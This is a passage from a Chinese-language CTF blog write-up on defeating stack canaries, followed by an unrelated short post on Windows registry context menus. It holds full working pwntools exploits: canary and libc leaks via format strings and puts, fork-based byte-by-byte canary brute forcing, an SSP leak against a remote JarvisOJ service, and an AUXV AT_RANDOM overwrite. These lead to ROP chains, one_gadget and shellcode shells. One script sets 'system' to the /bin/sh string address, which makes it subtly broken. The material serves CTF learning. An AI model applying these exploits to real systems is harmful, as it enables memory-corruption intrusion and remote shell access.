mapped0x00007ffffffdd000 0x00007ffffffff000 rw-p [stack]0xffffffffff600000 0xffffffffff601000 r-xp [vsyscall] 最后放上 exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/env pythonfrom pwn import *# context.log_level = &apos;debug&apos;context.arch = &apos;amd64&apos;local = 0if local: p = process(&apos;./microwave&apos;) libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;) libc_base_offset = 0xf72c0 one_gadget_offset = 0x45216else: p = remote(&apos;127.0.0.1&apos;, 1337) libc = ELF(&apos;./libc.so.6&apos;) libc_base_offset = 0xeb870 one_gadget_offset = 0x464d8elf = ELF(&apos;./microwave&apos;)log.success(&apos;libc_base_offset = &apos; + hex(libc_base_offset))log.success(&apos;one_gadget_offset = &apos; + hex(one_gadget_offset))def connect(username, password): p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;1&apos;) p.sendlineafter(&apos;username:&apos;, username) p.sendlineafter(&apos;password:&apos;, password)def edit(content): p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;2&apos;) p.sendlineafter(&apos;#&gt;&apos;, content)def tweet(): p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;3&apos;)def quit(): p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;q&apos;)# gdb.attach(p)password = &apos;n07_7h3_fl46&apos;connect(&apos;%p.&apos; * 8, password)p.recvuntil(&apos;Checking&apos;)leak_data = p.recvline().strip().split(&apos;.&apos;)[:-1]print leak_datacanary = int(leak_data[5][2:], 16)log.success(&apos;canary = &apos; + hex(canary))leak_libc = int(leak_data[1][2:], 16)log.success(&apos;leak_libc = &apos; + hex(leak_libc))libc_base = leak_libc - libc_base_offsetlog.success(&apos;libc_base = &apos; + hex(libc_base))one_gadget = libc_base + one_gadget_offsetlog.success(&apos;one_gadget = &apos; + hex(one_gadget))payload = flat([ &apos;A&apos; * 1032, canary, &apos;B&apos; * 8, one_gadget])edit(payload)p.interactive() 2017-CSAW-Quals-scv开了Canary： 123456[*] &apos;/home/assassinq/pwn/ctf-wiki/canary/2017-CSAW-Quals-csv/scv&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 就只有一个 main 函数，由于是 c++程序，看起来有点混乱： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __int64 v3; // rax __int64 v4; // rax __int64 v5; // rax __int64 v6; // rax __int64 v7; // rax __int64 v8; // rax __int64 v9; // rax __int64 v10; // rax __int64 v11; // rax __int64 v12; // rax __int64 v13; // rax __int64 v14; // rax __int64 v15; // rax __int64 v16; // rax __int64 v17; // rax __int64 v18; // rax __int64 v19; // rax __int64 v20; // rax __int64 v21; // rax int choice; // [rsp+4h] [rbp-BCh] int v24; // [rsp+8h] [rbp-B8h] int v25; // [rsp+Ch] [rbp-B4h] char buf; // [rsp+10h] [rbp-B0h] unsigned __int64 v27; // [rsp+B8h] [rbp-8h] v27 = __readfsqword(0x28u); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); choice = 0; v24 = 1; v25 = 0; while ( v24 ) &#123; v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]SCV GOOD TO GO,SIR....\"); std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"1.FEED SCV....\"); std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v7 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"2.REVIEW THE FOOD....\"); std::ostream::operator&lt;&lt;(v7, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v8 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"3.MINE MINERALS....\"); std::ostream::operator&lt;&lt;(v8, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v9 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v9, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"&gt;&gt;\"); std::istream::operator&gt;&gt;(&amp;std::cin, &amp;choice); switch ( choice ) &#123; case 2: // show v15 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v15, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v16 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]REVIEW THE FOOD...........\"); std::ostream::operator&lt;&lt;(v16, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v17 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v17, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v18 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]PLEASE TREAT HIM WELL.....\"); std::ostream::operator&lt;&lt;(v18, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v19 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v19, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); puts(&amp;buf); break; case 3: // exit v24 = 0; v20 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]BYE ~ TIME TO MINE MIENRALS...\"); std::ostream::operator&lt;&lt;(v20, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); break; case 1: // edit v10 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v10, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v11 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]SCV IS ALWAYS HUNGRY.....\"); std::ostream::operator&lt;&lt;(v11, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v12 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v12, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v13 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]GIVE HIM SOME FOOD.......\"); std::ostream::operator&lt;&lt;(v13, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v14 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v14, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"&gt;&gt;\"); v25 = read(0, &amp;buf, 0xF8uLL); break; default: v21 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]DO NOT HURT MY SCV....\"); std::ostream::operator&lt;&lt;(v21, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); break; &#125; &#125; return 0LL;&#125; 在case 1存在buffer overflow，通过调试观察到输入与Canary之间的偏移为 168。如果要泄漏Canary的话，就必须让所有的\\x00被覆盖掉，包括Canary低位的\\x00，以让puts认为 buf 连同Canary为一个字符串。libc 也可以用同样的方式泄漏，最后放上 exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'amd64'local = 1if local: p = process('./scv', env=&#123;'LD_PRELOAD':'./libc-2.23.so'&#125;)else: p = remote('127.0.0.1', 8888)libc = ELF('./libc-2.23.so')elf = ELF('./scv')# gdb.attach(p)system_offset = libc.symbols['system']str_bin_sh_offset = next(libc.search('/bin/sh'))log.success('system_offset = ' + hex(system_offset))log.success('str_bin_sh_offset = ' + hex(str_bin_sh_offset))pop_rdi_ret = 0x0000000000400ea3log.success('pop_rdi_ret = ' + hex(pop_rdi_ret))one_gadget_offset = 0x45216log.success('one_gadget_offset = ' + hex(one_gadget_offset))libc_base_offset = 0x3a20alog.success('libc_base_offset = ' + hex(libc_base_offset))def edit(content): p.sendlineafter('&gt;&gt;', '1') p.recvuntil('&gt;&gt;') p.send(content)def show(): p.sendlineafter('&gt;&gt;', '2')def quit(): p.sendlineafter('&gt;&gt;', '3')edit('A' * (40 - 1) + ':')show()p.recvuntil(':')leak_addr = u64(p.recv(6).ljust(8, '\\x00'))log.success('leak_addr = ' + hex(leak_addr))libc_base = leak_addr - libc_base_offsetlog.success('libc_base = ' + hex(libc_base))system = libc_base + str_bin_sh_offsetstr_bin_sh = libc_base + str_bin_sh_offsetlog.success('system = ' + hex(system))log.success('str_bin_sh = ' + hex(str_bin_sh))edit('A' * 168 + ':')show()p.recvuntil(':')canary = u64('\\x00' + p.recv(7))log.success('canary = ' + hex(canary))payload = flat([ 'A' * 168, canary, 'B' * 8, pop_rdi_ret, str_bin_sh, system])edit(payload)quit()p.interactive() 爆破CanaryCanary之所以被认为是安全的，是因为对其进行爆破成功率太低。以 32 位程序为例，除去最后一个\\x00，其可能值将会是0x100^3=16777216（实际上由于Canary的生成规则会小于这个值），64 位下的Canary值更是远大于这个数量级。此外，一旦Canary爆破失败，程序就会立即结束，Canary值也会再次更新，使得爆破更加困难。但是同一个进程内所有的Canary值都是一致的，当程序有多个进程，且子进程内出现了栈溢出时，由于子进程崩溃不会影响到主进程，我们就可以进行爆破。甚至我们可以通过逐位爆破来减少爆破时间。 2017-NSCTF-pwn2123456[*] '/home/assassinq/pwn/ctf-wiki/canary/2017-NSCTF-pwn2/pwn2' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 开启了Canary。main 函数中看到只要每次回答Y，可以无限次地 fork 出新的进程： 123456789101112131415161718192021222324252627282930313233343536int __cdecl main()&#123; char v1; // [esp+1Bh] [ebp-5h] __pid_t pid; // [esp+1Ch] [ebp-4h] setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); while ( 1 ) &#123; write(1, \"[*] Do you love me?[Y]\\n\", 0x17u); if ( getchar() != 'Y' ) break; v1 = getchar(); while ( v1 != '\\n' &amp;&amp; v1 ) ; pid = fork(); if ( pid ) &#123; if ( pid &lt;= 0 ) &#123; if ( pid &lt; 0 ) exit(0); &#125; else // son &#123; wait(0); &#125; &#125; else // father &#123; func(); &#125; &#125; return 0;&#125; func()函数中存在buffer overflow，而且还存在format string，那这里其实是可以用这个漏洞泄漏出Canary的： 12345678910111213141516171819202122unsigned int func()&#123; char *s; // ST18_4 int buf; // [esp+1Ch] [ebp-1Ch] int v3; // [esp+20h] [ebp-18h] int v4; // [esp+24h] [ebp-14h] int v5; // [esp+28h] [ebp-10h] unsigned int v6; // [esp+2Ch] [ebp-Ch] v6 = __readgsdword(0x14u); buf = 0; v3 = 0; v4 = 0; v5 = 0; s = (char *)malloc(0x40u); input_name(&amp;buf); sprintf(s, \"[*] Welcome to the game %s\", &amp;buf); printf(s); puts(\"[*] Input Your Id:\"); read(0, &amp;buf, 0x100u); return __readgsdword(0x14u) ^ v6;&#125; Canary采用爆破的方法，libc 则可以用格式化字符串泄漏。放上逐字节爆破 exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'i386'p = process('./pwn2', env=&#123;'LD_RELOAD':'./libc.so.6_x86'&#125;)elf = ELF('./pwn2')libc = ELF('./libc.so.6_x86')system_offset = libc.symbols['system']str_bin_sh_offset = next(libc.search('/bin/sh'))log.success('system_offset = ' + hex(system_offset))log.success('str_bin_sh_offset = ' + hex(str_bin_sh_offset))libc_offset = 0x1b2000log.success('libc_offset = ' + hex(libc_offset))one_gadget_offset = 0x3af1clog.success('one_gadget_offset = ' + hex(one_gadget_offset))# gdb.attach(p)def forkNew(): p.sendlineafter('[Y]', 'Y')def inputName(name): p.recvuntil('[*] Input Your name please:') p.send(name)def inputId(Id): p.recvuntil('[*] Input Your Id:') p.send(Id)canary = '\\x00'for i in range(3): for j in range(256): # log.info('try ' + hex(j)) if i != 0 and j == 0: p.sendline('Y') else: forkNew() inputName('%12$p\\n') p.recvuntil('[*] Welcome to the game ') leak_addr = int(p.recv(10), 16) payload = 'A' * 16 payload += canary payload += chr(j) inputId(payload) p.recv() if 'smashing' not in p.recv(): canary += chr(j) log.info('At round %d find canary byte %#x' %(i, j)) breaklog.success('canary = ' + hex(u32(canary)))log.success('leak_addr = ' + hex(leak_addr))libc_base = leak_addr - libc_offsetlog.success('libc_base = ' + hex(libc_base))system = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offsetone_gadget = libc_base + one_gadget_offsetlog.success('system = ' + hex(system))log.success('str_bin_sh = ' + hex(str_bin_sh))log.success('one_gadget = ' + hex(one_gadget))p.sendline('Y')inputName('AssassinQ\\n')payload = flat([ 'A' * 16, canary, 'B' * 12, one_gadget])inputId(payload)p.interactive() SSP（Stack Smashing Protect） Leak除了通过各种方法泄露Canary之外，我们还可以利用__stack_chk_fail函数泄露信息。这种方法作用不大，没办法让我们get shell。但是当我们需要泄露的 flag 或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做SSP（Stack Smashing Protect） Leak。 1234567891011void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail (\"stack smashing detected\");&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"&lt;unknown&gt;\");&#125; JarvisOJ-Smashes1234567[*] '/home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes' Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) FORTIFY: Enabled 开了Canary，存在溢出但是没法泄漏： 123456789101112131415161718192021222324252627282930unsigned __int64 sub_4007E0()&#123; __int64 i; // rbx int c; // eax __int64 v3; // [rsp+0h] [rbp-128h] unsigned __int64 v4; // [rsp+108h] [rbp-20h] v4 = __readfsqword(0x28u); __printf_chk(1LL, \"Hello!\\nWhat's your name? \"); if ( !_IO_gets((__int64)&amp;v3) )LABEL_9: _exit(1); i = 0LL; __printf_chk(1LL, \"Nice to meet you, %s.\\nPlease overwrite the flag: \"); while ( 1 ) &#123; c = _IO_getc(stdin); if ( c == -1 ) goto LABEL_9; if ( c == '\\n' ) break; flag[i++] = c; if ( i == 32 ) goto LABEL_8; &#125; memset((void *)((signed int)i + 6294816LL), 0, (unsigned int)(32 - i));LABEL_8: puts(\"Thank you, bye!\"); return __readfsqword(0x28u) ^ v4;&#125; 这里想到SSP Leak，只要我们能够输入足够长的字符串覆盖掉argv[0]，我们就能让Canary保护输出我们想要地址上的值： 123.rodata:000000000040094E ; char s[].rodata:000000000040094E s db &apos;Thank you, bye!&apos;,0 ; DATA XREF: sub_4007E0:loc_400878↑o.rodata:000000000040095E align 20h 尝试输出字符串 s： 1234567891011#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'p = remote('pwn.jarvisoj.com', 9877)test = 0x40094Ep.recvuntil('What\\'s your name?')p.sendline(p64(test) * 200)p.recvuntil('Please overwrite the flag:')p.sendline()p.recvall()p.interactive() 得到的结果果然泄漏出来了： 123[DEBUG] Received 0x4c bytes: 'Thank you, bye!\\n' '*** stack smashing detected ***: Thank you, bye! terminated\\n' 那么接下来需要做的就是找到存放 flag 的地址，在 ida 上找到是0x600d21，但是由于 main 函数中最后一句话memset((void *)((signed int)i + 6294816LL), 0, (unsigned int)(32 - i));，在调用__stack_chk_fail()的时候，0x600d21上的值早就已经被覆盖成其它值了。通过 gdb 调试，发现在另一个地址也有 flag： 12345assassinq&gt;&gt; find &apos;CTF&apos;Searching for &apos;CTF&apos; in: None rangesFound 2 results, display max 2 items:smashes : 0x400d21 (&quot;CTF&#123;Here&apos;s the flag on server&#125;&quot;)smashes : 0x600d21 (&quot;CTF&#123;Here&apos;s the flag on server&#125;&quot;) 这里就涉及到了 elf 文件的重映射，当可执行文件足够小的时候，文件的不同区段可能会被多次映射： 123456789101112131415161718assassinq&gt;&gt; vmmapStart End Perm Name0x00400000 0x00401000 r-xp /home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes0x00600000 0x00601000 rw-p /home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fd7000 0x00007ffff7fda000 rw-p mapped0x00007ffff7ff7000 0x00007ffff7ffa000 r--p [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p mapped0x00007ffffffde000 0x00007ffffffff000 rw-p [stack]0xffffffffff600000 0xffffffffff601000 r-xp [vsyscall] 那么 exp 如下： 123456789101112#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'p = remote('pwn.jarvisoj.com', 9877)test = 0x40094Eflag = 0x400d20p.recvuntil('What\\'s your name?')p.sendline(p64(flag) * 200)p.recvuntil('Please overwrite the flag:')p.sendline()p.recvall()p.interactive() Auxiliary Vector直接“挖”到 canary 产生的本源——AUXV(Auxiliary Vector)，并修改该结构体从而使 canary 值可控。 2017-TCTF-Final-upxof123456789λ checksec ./upxof[*] '/home/assassinq/Course_4/2017-TCTF-Final-upxof/upxof' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Packer: Packed with UPX 拖进 ida 里发现有壳，upx -d一下： 12345678910λ upx -d upxof Ultimate Packer for eXecutables Copyright (C) 1996 - 2013UPX 3.91 Markus Oberhumer, Laszlo Molnar &amp; John Reiser Sep 30th 2013 File size Ratio Format Name -------------------- ------ ----------- ----------- 10116 &lt;- 6253 61.81% linux/ElfAMD upxofUnpacked 1 file. main 函数长这个样子，gets这里显然有一个溢出点： 12345678910111213int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+0h] [rbp-410h] unsigned __int64 v5; // [rsp+408h] [rbp-8h] v5 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); printf(\"let's go:\", 0LL); gets(&amp;v4); return 0;&#125; 但是在尝试的时候发现这里有canary，疑惑地重新checksec一下，发现脱了壳变得不一样了： 1234567λ checksec ./upxof_no_upx[*] '/home/assassinq/Course_4/2017-TCTF-Final-upxof/upxof_no_upx' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 这里又不能泄漏，于是就需要用另一种方法来搞定canary，就是改变auxv结构体中的内容。auxv中包含了canary的地址，在动态链接之前就已经确定。（这篇文章讲得比较深入，还有phrack 上也有一篇文章） auxv结构可以在elf/elf.h里看到： 1234567891011121314151617181920212223242526272829/* Auxiliary vector. *//* This vector is normally only used by the program interpreter. The usual definition in an ABI supplement uses the name auxv_t. The vector is not usually defined in a standard &lt;elf.h&gt; file, but it can't hurt. We rename it to avoid conflicts. The sizes of these types are an arrangement between the exec server and the program interpreter, so we don't fully specify them here. */typedef struct&#123; uint32_t a_type; /* Entry type */ union &#123; uint32_t a_val; /* Integer value */ /* We use to have pointer elements added here. We cannot do that, though, since it does not work when using 32-bit definitions on 64-bit platforms and vice versa. */ &#125; a_un;&#125; Elf32_auxv_t;typedef struct&#123; uint64_t a_type; /* Entry type */ union &#123; uint64_t a_val; /* Integer value */ /* We use to have pointer elements added here. We cannot do that, though, since it does not work when using 32-bit definitions on 64-bit platforms and vice versa. */ &#125; a_un;&#125; Elf64_auxv_t; 自己写一个带有canary的程序，用 gdb 调一下，info auxv查看结构体的内容： 1234567891011121314151617181920assassinq&gt;&gt; info auxv33 AT_SYSINFO_EHDR System-supplied DSO&apos;s ELF header 0x7ffff7ffa00016 AT_HWCAP Machine-dependent CPU capability hints 0xf8bfbff6 AT_PAGESZ System page size 409617 AT_CLKTCK Frequency of times() 1003 AT_PHDR Program headers for program 0x4000404 AT_PHENT Size of program header entry 565 AT_PHNUM Number of program headers 97 AT_BASE Base address of interpreter 0x7ffff7dd70008 AT_FLAGS Flags 0x09 AT_ENTRY Entry point of program 0x4004a011 AT_UID Real user ID 100012 AT_EUID Effective user ID 100013 AT_GID Real group ID 100014 AT_EGID Effective group ID 100023 AT_SECURE Boolean, was exec setuid-like? 025 AT_RANDOM Address of 16 random bytes 0x7fffffffe0e931 AT_EXECFN File name of executable 0x7fffffffefc2 &quot;/home/assassinq/Course_4/2017-TCTF-Final-upxof/canary&quot;15 AT_PLATFORM String identifying platform 0x7fffffffe0f9 &quot;x86_64&quot;0 AT_NULL End of vector 0x0 经过了解，结构体中AT_RANDOM的值对应了canary的值（The value is a pointer to sixteen random bytes provided by the kernel. The dynamic linker uses this to implement a stack canary），可以测试一下： 1234assassinq&gt;&gt; x/gx 0x7fffffffe0e90x7fffffffe0e9: 0x47747e045c58c8d8assassinq&gt;&gt; canarycanary : 0x47747e045c58c800 还有比较重要的是，程序一开始AT_RANDOM、AT_EXECFN、AT_PLATFORM和其他的值都会被 push 到栈上： 12345678assassinq&gt;&gt; stack 1000...1280| 0x7fffffffe0b0 --&gt; 0x7fffffffe0e9 --&gt; 0x47747e045c58c8d81288| 0x7fffffffe0b8 --&gt; 0x1f1296| 0x7fffffffe0c0 --&gt; 0x7fffffffefc2 (&quot;/home/assassinq/Course_4/2017-TCTF-Final-upxof/canary&quot;)1304| 0x7fffffffe0c8 --&gt; 0xf1312| 0x7fffffffe0d0 --&gt; 0x7fffffffe0f9 --&gt; 0x34365f363878 (&apos;x86_64&apos;)... 可以searchmem一下看到存放canary的地方： 123456789assassinq&gt;&gt; searchmem 0x7fffffffe0e9Searching for &apos;0x7fffffffe0e9&apos; in: None rangesFound 1 results, display max 1 items:[stack] : 0x7fffffffe0b0 --&gt; 0x7fffffffe0e9 --&gt; 0x47747e045c58c8d8assassinq&gt;&gt; searchmem 0x47747e045c58c800Searching for &apos;0x47747e045c58c800&apos; in: None rangesFound 2 results, display max 2 items: mapped : 0x7ffff7fda728 --&gt; 0x47747e045c58c800[stack] : 0x7fffffffdc78 --&gt; 0x47747e045c58c800 最后基本上就可以知道canary的起源是如下的方式： 1kernel----&gt;AT_RANDOM----&gt;fs:[0x28]----&gt;canary 那么思路就分成了两步： 在程序还没有链接的时候把auxv的结构体覆盖，修改AT_RANDOM以设置canary为已知的值 接下来直接溢出做 ROP 或者直接跳到 shellcode 上 现在看来这个 upx 壳显然是有意义的。需要在没有被脱壳的情况下，没有被载入前覆盖掉auxv。第一次加载壳的时候可以输入长为0x4096的字符串，前八位则要求必须是12345678才能过 check。接下来解壳之后就可以溢出。 L4ys 大佬的 exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.arch = 'amd64'p = process('./upxof')# gdb.attach(p, 'b *0x400a1c')p.recvuntil('password:')password = '12345678'payload = passwordpayload += p64(0) * 14payload += p64(1) # argcpayload += p64(0x400008) # argvpayload += p64(0)payload += p64(0x400008) * 39 # envppayload += p64(0)# aux vector# payload += p64(0x21)# payload += p64(0x7ffff7ffd000)# payload += p64(0x10) # AT_HWCAP# payload += p64(0x1f8bfbff)# payload += p64(0x6) # AT_PAGESZ# payload += p64(0x1000)# payload += p64(0x11) # AT_CLKTCK# payload += p64(0x64)payload += p64(0x3) # AT_PHDRpayload += p64(0x400040)# payload += p64(0x4) # AT_PHENT# payload += p64(0x38)payload += p64(0x5) # AT_PHNUMpayload += p64(0x2)# payload += p64(0x7) # AT_BASE# payload += p64(0x0)# payload += p64(0x8) # AT_FLAGS# payload += p64(0x0)payload += p64(0x9) # AT_ENTRYpayload += p64(0x400988)# payload += p64(0xb) # AT_UID# payload += p64(0x0)# payload += p64(0xc) # AT_EUID# payload += p64(0x0)# payload += p64(0xd) # AT_GID# payload += p64(0x0)# payload += p64(0xe) # AT_EGID# payload += p64(0x0)# payload += p64(0x17) # AT_SECURE# payload += p64(0x0)payload += p64(0x19) # AT_RANDOMpayload += p64(0x800008)# payload += p64(0x1f) # AT_EXECFN# payload += p64(0x7fffffffeff0) # --&gt; 0x666f7870752f2e ('./upxof')# payload += p64(0xf) # AT_PLATFORM# payload += p64(0x7fffffffe659) # --&gt; 0x34365f363878 ('x86_64')payload += p64(0)payload += p64(0)p.sendline(payload)p.recvuntil('go:')pop_rdi = 0x4007f3gets = 0x4005B0p.sendline(flat('\\x00' * 1048, pop_rdi, 0x00800000, gets, 0x00800000))p.sendline(asm(shellcraft.sh()))p.interactive() 参考网站https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/https://www.anquanke.com/post/id/85203https://bbs.ichunqiu.com/thread-44069-1-1.htmlhttps://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/https://www.jianshu.com/p/c3624f5dd583https://deadc0de.re/articles/microwave-write-up.htmlhttps://braddaniels.org/csaw-quals-2017-scv/https://reversingpwn.wordpress.com/2017/09/18/writeup-csaw-2017-scv/https://n132.github.io/2019/02/25/2019-03-01-auxv-origin-of-canaries/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"qianfei11.coding.me/tags/pwn/"}]},{"title":"为Windows系统鼠标右键添加软件和图标","slug":"为Windows系统鼠标右键添加软件和图标","date":"2019-02-15T03:00:27.000Z","updated":"2019-08-26T05:52:25.162Z","comments":true,"path":"2019/02/15/为Windows系统鼠标右键添加软件和图标/","link":"","permalink":"qianfei11.coding.me/2019/02/15/为Windows系统鼠标右键添加软件和图标/","excerpt":"Windows 下不想要总是先打开软件，再把文件拖进去。那就可以修改一下右键菜单。","text":"Windows 下不想要总是先打开软件，再把文件拖进去。那就可以修改一下右键菜单。 修改文件右键菜单查壳还有调试的时候总是把文件拖来拖去实在太麻烦了，不如修改一下，直接右键就能开始分析。下面就记录一下修改文件右键菜单的过程： 首先打开注册表： 依次进入计算机\\HKEY_CLASSES_ROOT\\*\\shell，在shell项下新建一个项，这里以 PEID 为例。然后在新建好的PEID项下，新建字符串值，命名为Icon，并将其值修改为源文件的绝对路径（$PATH_TO_EXE）： 最后再在PEID项下新建项Command，修改其值为&quot;$PATH_TO_EXE&quot; &quot;%1&quot;： 成功后看一看效果： 修改空白处右键菜单在当前目录下打开cmd窗口太麻烦，不如也添加到右键菜单里： 首先同样打开注册表。进入计算机\\HKEY_CLASSES_ROOT\\Directory\\Background\\shell，新建项在此运行CMD，同以上一样新建字符串值Icon，并修改值： 在在此运行CMD下新建项Command，修改值为$PATH_TO_EXE，这里不需要双引号&quot;，也不需要%1： 看看效果： 参考网站https://blog.csdn.net/p312011150/article/details/81207059","categories":[],"tags":[{"name":"solution","slug":"solution","permalink":"qianfei11.coding.me/tags/solution/"}]},{"title":"中级ROP-ret2__libc_csu_init","slug":"中级ROP-ret2-libc-csu-init","date":"2019-02-12T10:02:50.000Z","updated":"2019-08-26T05:55:48.336Z","comments":true,"path":"2019/02/12/中级ROP-ret2-libc-csu-init/","link":"","permalink":"qianfei11.coding.me/2019/02/12/中级ROP-ret2-libc-csu-init/","excerpt":"用蒸米的一步一步学 ROP 之 linux_x64 篇中的 level5 来研究一下 64 位的 ROP。","text":"用蒸米的一步一步学 ROP 之 linux_x64 篇中的 level5 来研究一下 64 位的 ROP。 64 